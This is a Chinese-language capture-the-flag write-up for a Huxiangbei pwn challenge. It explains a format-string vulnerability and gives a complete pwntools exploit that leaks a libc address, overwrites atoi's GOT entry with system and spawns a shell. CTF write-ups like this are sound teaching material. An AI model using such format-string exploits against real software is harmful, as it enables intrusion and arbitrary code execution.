湖湘杯的pwn比赛很有趣，我做了pwns200的题目，感觉不错，我把wp分享出来，pwns的下载链接见附件  
把pwns100直接拖入ida中：  
main函数：  
sub_80485CD函数：  
在sub_80485CD函数可以看到输入的数据直接进入了printf函数中，所以这个肯定是一个格式化字符串漏洞  
先运行一下程序看一下这个程序干了啥  
再看看程序开启了哪些保护:  
这个程序开了Canary和栈不可执行  
这个题目的思路和
差不多，唯一不同的是上一个题目提供了system函数，这个题目要从libc中找system函数，所以首先通过printf打印__libc_start_main函数这个地址，然后根据偏移计算libc的基地址，然后计算出system的实际地址，最后用`fmtstr_payload(autofmt.offset,
{atoi_got_addr: system_addr})`把atio的地址覆盖为system的地址，就可以getshell了  
我的exp是：
    from pwn import *
    def debug(addr = '0x0804867E'):
        raw_input('debug:')
        gdb.attach(r, "b *" + addr)
    def base_addr(prog_addr,offset):
        return eval(prog_addr)-offset
    #localsystem = 0x0003ADA0
    context(arch='i386', os='linux', log_level='debug')
    r = process('/home/h11p/hackme/huxiangbei/pwne')
    #r = remote('hackme.inndy.tw', 7711)
    elf = ELF('/home/h11p/hackme/huxiangbei/pwne')
    libc=ELF('/lib/i386-linux-gnu/libc.so.6')
    def exec_fmt(payload):
        r.recvuntil('WANT PLAY[Y/N]\n')
        r.sendline('Y')
        r.recvuntil('GET YOUR NAME:\n')
        r.recvuntil('\n')
        r.sendline(payload)
        info = r.recv().splitlines()[1]
        print "info:"+info
        r.sendline('10')
        #r.close()
        return info
    autofmt = FmtStr(exec_fmt)
    r.close()
    r = process('/home/h11p/hackme/huxiangbei/pwne')
    atoi_got_addr = elf.got['atoi']
    print "%x" % atoi_got_addr
    system_offset_addr = libc.symbols['system']
    print "%x" % system_offset_addr
    payload1="%35$p"
    #debug()
    r.recvuntil('WANT PLAY[Y/N]\n')
    r.sendline('Y')
    r.recvuntil('GET YOUR NAME:\n')
    r.recvuntil('\n')
    r.sendline(payload1)
    libc_start_main = r.recv().splitlines()[1]
    libc_module=base_addr(libc_start_main,0x18637)
    system_addr=libc_module+system_offset_addr
    print "system_addr:"+hex(system_addr)
    r.sendline('10')
    payload2 = fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr})
    r.recvuntil('WANT PLAY[Y/N]\n')
    r.sendline('Y')
    r.recvuntil('GET YOUR NAME:\n')
    r.recvuntil('\n')
    r.sendline(payload2)
    r.recv()
    #r.sendline('10')
    r.sendline('/bin/sh')
    r.interactive()
    r.close()
效果是：